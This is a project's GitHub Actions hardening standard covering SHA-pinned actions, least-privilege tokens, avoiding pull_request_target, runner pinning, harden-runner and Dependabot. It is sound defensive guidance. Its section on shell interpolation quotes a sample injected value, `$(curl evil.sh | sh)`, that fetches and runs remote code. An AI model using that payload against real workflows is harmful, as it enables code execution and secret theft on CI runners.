# GitHub Actions hardening standard

Every workflow in `.github/workflows/` follows the rules below. They exist
to limit the blast radius of a compromised action, a malicious pull
request, or a leaked token. A change that relaxes any of these needs a
matching change to this document and a note in the pull request explaining
why.

## Pin every action to a commit SHA

Every `uses:` names a full 40-hexadecimal commit SHA, followed by a
`# vX.Y.Z` comment recording the human-readable release it corresponds to:

```yaml
uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
```

Tag refs (`@v7`, `@v7.0.1`) and branch refs (`@main`) are mutable: the
owner, or an attacker who compromises the owner's account, can repoint them
at new code without the SHA changing. A pinned SHA is immutable. Dependabot
(see below) proposes SHA bumps as pull requests, keeping the `# vX.Y.Z`
comment in sync.

When adding or bumping an action, resolve the SHA from the release tag
yourself (GitHub's "releases" page, or the API) rather than trusting a
value pasted from documentation.

## Start with no permissions, grant per job

Each workflow sets `permissions: {}` at the top level, which drops the
`GITHUB_TOKEN` to no scopes. Every job then re-grants only the scopes it
uses, e.g.:

```yaml
permissions:
  contents: read
```

The Scorecard workflow is the only one that needs more (`security-events:
write` to upload findings, `id-token: write` to publish via OIDC); it
grants exactly those on the single job that needs them.

## `pull_request`, never `pull_request_target`

Workflows trigger on `push` and `pull_request` only. `pull_request` runs
the workflow from the base of the fork with a read-only token and no
access to secrets, so untrusted PR code cannot exfiltrate anything.
`pull_request_target` runs the base repo's workflow with a read-write
token and secrets in scope while checking out PR code; it is a standing
privilege-escalation risk and is not used here.

## Do not interpolate event context into shell

No `run:` step embeds `${{ github.event.* }}` (PR titles, branch names,
commit messages, author fields, ...) or any other attacker-controllable
`${{ }}` expression directly in the script body. Those strings are
substituted before the shell parses the line, so a crafted value such as
`$(curl evil.sh | sh)` executes. Pass the value through `env:` and
reference it as a quoted shell variable instead:

```yaml
- env:
    TITLE: ${{ github.event.pull_request.title }}
  run: echo "$TITLE"
```

`ci.yml` carries a comment restating this rule at the point future steps
would be added.

## Pin the runner image

`runs-on` names a dated image (`ubuntu-24.04`), not `ubuntu-latest`. The
`latest` alias rolls to a new OS major version on GitHub's schedule, which
turns an unrelated push into the first (unplanned) test of the new image.

## harden-runner on every job

`step-security/harden-runner` is the first step of every job, with
`egress-policy: audit`. In audit mode it records outbound network
connections without blocking them, which builds the baseline needed before
any future move to `egress-policy: block`. Being first means it is in
place before any other action runs.

## Concurrency

`ci.yml` declares a `concurrency` group keyed on
`${{ github.workflow }}-${{ github.ref }}` with `cancel-in-progress: true`,
so a new push to a branch cancels that branch's in-flight run instead of
queueing behind it.

## Dependency updates

`.github/dependabot.yml` enables weekly updates for:

- `github-actions` — SHA bumps for the pinned `uses:` refs above.
- `pip` — the `pyproject.toml` `dev` extra, which feeds the FreeCAD-free
  install path and CI's fast leg.

Dependabot has no pixi support, so `pixi.lock` is refreshed by hand with
`pixi update` when the conda-side toolchain needs to move.

## OpenSSF Scorecard

`.github/workflows/scorecard.yml` runs `ossf/scorecard-action` on
`branch_protection_rule`, a weekly `schedule`, and `push` to `main`. It
uploads SARIF results to code scanning and publishes to the public
Scorecard dataset. Treat a dropping score as a regression to investigate.
